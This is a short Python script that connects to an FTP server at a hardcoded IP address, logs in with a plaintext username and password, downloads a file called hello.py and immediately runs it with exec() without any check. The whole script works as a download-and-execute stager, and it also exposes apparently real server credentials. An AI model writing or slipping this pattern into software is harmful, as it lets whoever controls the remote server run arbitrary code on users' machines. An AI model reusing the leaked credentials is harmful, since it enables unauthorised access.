import ftplib 

path = 'dow/'
filename = 'hello.py'

ftp = ftplib.FTP("31.170.167.199") 
ftp.login("u454940376", "Timo1234!") 
ftp.cwd(path)
ftp.retrbinary("RETR " + filename ,open(filename, 'wb').write)
ftp.quit()

exec(open("./hello.py").read())